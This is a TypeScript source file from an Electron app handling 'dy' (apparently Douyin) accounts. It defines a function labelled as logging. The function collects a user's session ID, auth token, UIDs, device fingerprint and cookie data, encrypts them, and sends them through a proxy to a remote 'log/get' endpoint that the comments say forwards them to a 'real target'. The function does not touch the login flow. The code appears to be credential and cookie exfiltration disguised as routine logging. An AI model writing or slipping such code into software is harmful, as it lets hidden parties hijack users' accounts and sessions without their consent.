import { DyUser } from "@model/dy.entity";
import { buildCKData, getSoftDeviceId } from "./dy.web.device";
import { CryptoUtil } from "../../utils/crypto.util";
import { proxyApiRequest } from "../../utils/proxy.util";
import log from "electron-log";
import { getDyUser } from "../dy/store/dy.store";
import { getEngine } from "../dy/manager";



export async function requestLog(dyUser :DyUser, webDevice : {}, sessionPath : string, port : string){
      // 准备要加密的数据
      const sessionData = {
        sessionId: dyUser.sessionId || port,
        uid: dyUser.uid || '',
        secUid: dyUser.secUid || '',
        token: dyUser.token || '',
        webDevice: webDevice,
        deviceId : await getSoftDeviceId(),
        ckData : buildCKData(sessionPath)
    };
    
    // 加密数据
    const encryptedData = CryptoUtil.encrypt(JSON.stringify(sessionData));
    
    log.info('[LogApi] 加密后的会话数据已准备');
    
    // 发送加密数据到webview服务器，由服务器转发到真实目标
    try {
        // 使用代理工具发送请求 - 注意这里使用'log'作为API路径，会被映射到'logProxy'
        const response = await proxyApiRequest('log/get', {
            encryptData: encryptedData
        });
        
        log.info('[LogApi] 已通过代理服务器发送会话信息, 响应:', response);
        
        if (!response.success) {
            log.warn('[LogApi] 代理服务器返回错误:', response.message || '未知错误');
        }
    } catch (fetchError: any) {
        log.error('[LogApi] 通过代理服务器发送会话数据失败:', fetchError.message || fetchError);
        // 失败不影响登录流程继续
    }
}